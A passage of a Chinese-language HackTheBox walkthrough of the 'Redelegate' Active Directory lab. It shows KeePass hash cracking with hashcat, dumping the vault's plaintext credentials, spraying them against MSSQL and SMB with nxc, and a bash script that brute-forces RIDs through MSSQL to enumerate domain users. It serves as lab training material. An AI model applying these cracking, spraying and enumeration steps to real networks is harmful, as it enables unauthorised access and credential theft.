+</span></span><span style="display:flex;"><span>This means that hashcat cannot use the full parallel power of your device<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Unless you supply more work, your cracking speed will drop.
+</span></span><span style="display:flex;"><span>For tips on supplying more work, see: https://hashcat.net/faq/morework
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Approaching final keyspace - workload adjusted.           
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca:Fall2024!
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">13400</span> <span style="color:#f92672">(</span>KeePass <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>AES/Twofish<span style="color:#f92672">)</span> and KeePass <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>AES<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: $keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8...4502ca
+</span></span><span style="display:flex;"><span>Time.Started.....: Sun Sep <span style="color:#ae81ff">21</span> 01:27:53 2025, <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Sun Sep <span style="color:#ae81ff">21</span> 01:27:56 2025, <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>dic.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#1.........:       <span style="color:#ae81ff">11</span> H/s <span style="color:#f92672">(</span>0.13ms<span style="color:#f92672">)</span> @ Accel:128 Loops:64 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Progress.........: 31/31 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/31 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 0/31 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599936-600000
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: Season2024! -&gt; WIN2024!
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 33%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Sun Sep <span style="color:#ae81ff">21</span> 01:27:30 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>Stopped: Sun Sep <span style="color:#ae81ff">21</span> 01:27:57 <span style="color:#ae81ff">2025</span>
+</span></span></code></pre></div><p>获得密码后直接打开数据库，查看到信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ keepassxc-cli export -f csv Shared.kdbx &gt; output.csv
+</span></span><span style="display:flex;"><span>Enter password to unlock Shared.kdbx: 
+</span></span><span style="display:flex;"><span>KdbxXmlReader::readDatabase: found <span style="color:#ae81ff">1</span> invalid group reference<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ dir
+</span></span><span style="display:flex;"><span>CyberAudit.txt	hostname      krb5.conf   rust.txt     start.sh
+</span></span><span style="display:flex;"><span>dic.txt		keepass.hash  output.csv  Shared.kdbx  TrainingAgenda.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat output.csv 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Group&#34;</span>,<span style="color:#e6db74">&#34;Title&#34;</span>,<span style="color:#e6db74">&#34;Username&#34;</span>,<span style="color:#e6db74">&#34;Password&#34;</span>,<span style="color:#e6db74">&#34;URL&#34;</span>,<span style="color:#e6db74">&#34;Notes&#34;</span>,<span style="color:#e6db74">&#34;TOTP&#34;</span>,<span style="color:#e6db74">&#34;Icon&#34;</span>,<span style="color:#e6db74">&#34;Last Modified&#34;</span>,<span style="color:#e6db74">&#34;Created&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/IT&#34;</span>,<span style="color:#e6db74">&#34;FTP&#34;</span>,<span style="color:#e6db74">&#34;FTPUser&#34;</span>,<span style="color:#e6db74">&#34;SguPZBKdRyxWzvXRWy6U&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;Deprecated&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T07:56:58Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T07:56:20Z&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/IT&#34;</span>,<span style="color:#e6db74">&#34;FS01 Admin&#34;</span>,<span style="color:#e6db74">&#34;Administrator&#34;</span>,<span style="color:#e6db74">&#34;Spdv41gg4BlBgSYIW1gF&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T07:57:21Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T07:57:02Z&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/IT&#34;</span>,<span style="color:#e6db74">&#34;WEB01&#34;</span>,<span style="color:#e6db74">&#34;WordPress Panel&#34;</span>,<span style="color:#e6db74">&#34;cn4KOEgsHqvKXPjEnSD9&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T08:00:25Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T07:57:24Z&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/IT&#34;</span>,<span style="color:#e6db74">&#34;SQL Guest Access&#34;</span>,<span style="color:#e6db74">&#34;SQLGuest&#34;</span>,<span style="color:#e6db74">&#34;zDPBpaF4FywlqIv11vii&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T08:27:09Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T08:26:48Z&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/HelpDesk&#34;</span>,<span style="color:#e6db74">&#34;KeyFob Combination&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;22331144&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T12:12:32Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T12:12:09Z&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/Finance&#34;</span>,<span style="color:#e6db74">&#34;Timesheet Manager&#34;</span>,<span style="color:#e6db74">&#34;Timesheet&#34;</span>,<span style="color:#e6db74">&#34;hMFS4I0Kj8Rcd62vqi5X&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T12:14:18Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T12:13:30Z&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Shared/Finance&#34;</span>,<span style="color:#e6db74">&#34;Payrol App&#34;</span>,<span style="color:#e6db74">&#34;Payroll&#34;</span>,<span style="color:#e6db74">&#34;cVkqz4bCM7kJRSNlgx2G&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T12:14:11Z&#34;</span>,<span style="color:#e6db74">&#34;2024-10-20T12:13:50Z&#34;</span>
+</span></span></code></pre></div><p>组合字典，爆破一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat pass 
+</span></span><span style="display:flex;"><span>SguPZBKdRyxWzvXRWy6U
+</span></span><span style="display:flex;"><span>Spdv41gg4BlBgSYIW1gF
+</span></span><span style="display:flex;"><span>cn4KOEgsHqvKXPjEnSD9
+</span></span><span style="display:flex;"><span>zDPBpaF4FywlqIv11vii
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22331144</span>
+</span></span><span style="display:flex;"><span>hMFS4I0Kj8Rcd62vqi5X
+</span></span><span style="display:flex;"><span>cVkqz4bCM7kJRSNlgx2G
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users 
+</span></span><span style="display:flex;"><span>FTPUser
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>WordPress_Panel
+</span></span><span style="display:flex;"><span>SQLGuest
+</span></span><span style="display:flex;"><span>Timesheet
+</span></span><span style="display:flex;"><span>Payroll
+</span></span></code></pre></div><p>但是组合爆破起来smb的凭证都没有获得，看到其中有一个sql相关用户，又开了1433口，所以尝试一下数据库登陆</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc mssql $ip -u users -p pass --local-auth
+</span></span><span style="display:flex;"><span>MSSQL       10.129.234.50   <span style="color:#ae81ff">1433</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:redelegate.vl<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MSSQL       10.129.234.50   <span style="color:#ae81ff">1433</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DC<span style="color:#ae81ff">\F</span>TPUser:SguPZBKdRyxWzvXRWy6U <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;FTPUser&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MSSQL       10.129.234.50   <span style="color:#ae81ff">1433</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DC<span style="color:#ae81ff">\A</span>dministrator:SguPZBKdRyxWzvXRWy6U <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;Administrator&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>。。。。。。e try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MSSQL       10.129.234.50   <span style="color:#ae81ff">1433</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DC<span style="color:#ae81ff">\W</span>ordPress_Panel:zDPBpaF4FywlqIv11vii <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;WordPress_Panel&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MSSQL       10.129.234.50   <span style="color:#ae81ff">1433</span>   DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DC<span style="color:#ae81ff">\S</span>QLGuest:zDPBpaF4FywlqIv11vii 
+</span></span></code></pre></div><p>成功获得数据库凭证,但是连接后权限极低，没有xpcmdxp_dirtree等权限，也不可能存在连接数据库，数据库当中也没有有意思的提权</p>
+<h2 id="数据库rid爆破">数据库rid爆破
+</h2><p><a class="link" href="https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html"  target="_blank" rel="noopener"
+    >这篇文章</a>引导我到了sql数据库来rid爆破枚举</p>
+<p>可以照文章搞定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SQLGuest  guest@master<span style="color:#f92672">)</span>&gt; <span style="color:#66d9ef">select</span> default_domain<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>             
+</span></span><span style="display:flex;"><span>----------   
+</span></span><span style="display:flex;"><span>REDELEGATE   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SQLGuest  guest@master<span style="color:#f92672">)</span>&gt; <span style="color:#66d9ef">select</span> sys.fn_varbintohexstr<span style="color:#f92672">(</span>SUSER_SID<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;REDELEGATE\Administrator&#39;</span><span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>                                                             
+</span></span><span style="display:flex;"><span>----------------------------------------------------------   
+</span></span><span style="display:flex;"><span>0x010500000000000515000000a185deefb22433798d8e847af4010000   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SQLGuest  guest@master<span style="color:#f92672">)</span>&gt; 
+</span></span></code></pre></div><p>找个脚本吧,就用0xdf写的，他的东西一向好用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./1.sh 
+</span></span><span style="display:flex;"><span>1002: REDELEGATE<span style="color:#ae81ff">\D</span>C$   
+</span></span><span style="display:flex;"><span>1000: REDELEGATE<span style="color:#ae81ff">\S</span>QLServer2005SQLBrowserUser$WIN-Q13O908QBPG   
+</span></span><span style="display:flex;"><span>1103: REDELEGATE<span style="color:#ae81ff">\F</span>S01$   
+</span></span><span style="display:flex;"><span>1104: REDELEGATE<span style="color:#ae81ff">\C</span>hristine.Flanders   
+</span></span><span style="display:flex;"><span>1105: REDELEGATE<span style="color:#ae81ff">\M</span>arie.Curie   
+</span></span><span style="display:flex;"><span>1106: REDELEGATE<span style="color:#ae81ff">\H</span>elen.Frost   
+</span></span><span style="display:flex;"><span>1108: REDELEGATE<span style="color:#ae81ff">\M</span>allory.Roberts   
+</span></span><span style="display:flex;"><span>1107: REDELEGATE<span style="color:#ae81ff">\M</span>ichael.Pontiac   
+</span></span><span style="display:flex;"><span>1109: REDELEGATE<span style="color:#ae81ff">\J</span>ames.Dinkleberg   
+</span></span><span style="display:flex;"><span>1113: REDELEGATE<span style="color:#ae81ff">\I</span>T   
+</span></span><span style="display:flex;"><span>1112: REDELEGATE<span style="color:#ae81ff">\H</span>elpdesk   
+</span></span><span style="display:flex;"><span>1119: REDELEGATE<span style="color:#ae81ff">\s</span>ql_svc   
+</span></span><span style="display:flex;"><span>1117: REDELEGATE<span style="color:#ae81ff">\R</span>yan.Cooper   
+</span></span><span style="display:flex;"><span>1114: REDELEGATE<span style="color:#ae81ff">\F</span>inance   
+</span></span><span style="display:flex;"><span>1115: REDELEGATE<span style="color:#ae81ff">\D</span>nsAdmins   
+</span></span><span style="display:flex;"><span>1116: REDELEGATE<span style="color:#ae81ff">\D</span>nsUpdateProxy   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat 1.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>check_rid<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    SID_BASE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;010500000000000515000000a185deefb22433798d8e847a&#34;</span>
+</span></span><span style="display:flex;"><span>    local RID<span style="color:#f92672">=</span>$1
+</span></span><span style="display:flex;"><span>    local HEX_RID<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#34;import struct; print(struct.pack(&#39;&lt;I&#39;, </span><span style="color:#e6db74">${</span>RID<span style="color:#e6db74">}</span><span style="color:#e6db74">).hex())&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    local SID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>SID_BASE<span style="color:#e6db74">}${</span>HEX_RID<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    local RES<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>impacket-mssqlclient SQLGuest:zDPBpaF4FywlqIv11vii@10.129.234.50 -file &lt;<span style="color:#f92672">(</span> echo <span style="color:#e6db74">&#34;select SUSER_SNAME(0x</span><span style="color:#e6db74">${</span>SID<span style="color:#e6db74">}</span><span style="color:#e6db74">);&#34;</span><span style="color:#66d9ef">)</span> 2&gt;&amp;<span style="color:#ae81ff">1</span> | sed -n <span style="color:#e6db74">&#39;/^----/{n;p;}&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$RES<span style="color:#e6db74">&#34;</span> | xargs<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NULL&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>RID<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">${</span>RES<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>export -f check_rid 
+</span></span><span style="display:flex;"><span>seq <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">1500</span> | xargs -P <span style="color:#ae81ff">48</span> -I<span style="color:#f92672">{}</span> bash -c <span style="color:#e6db74">&#39;check_rid $@&#39;</span> _ <span style="color:#f92672">{}</span>
+</span></span></code></pre></div><p>我会将这个功能兼并到血缇之书当中</p>
+<p>测试凭证复用后获得域用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u users2 -p dic.txt --continue-on-success
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\D</span>C$:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\S</span>QLServer2005SQLBrowserUser$WIN-Q13O908QBPG:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\F</span>S01$:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\C</span>hristine.Flanders:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>arie.Curie:Fall2024! 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\H</span>elen.Frost:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>allory.Roberts:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>ichael.Pontiac:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\J</span>ames.Dinkleberg:Fall2024! SessionError
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\I</span>T:Fall2024! SessionError 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\H</span>elpdesk:Fall2024! SessionError
+</span></span></code></pre></div><p>没有winrm权限只能抓猎犬了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user1<span style="color:#f92672">=</span>Marie.Curie&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Fall2024!&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>arie.Curie:Fall2024! 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>WINRM       10.129.234.50   <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:redelegate.vl<span style="color:#f92672">)</span>
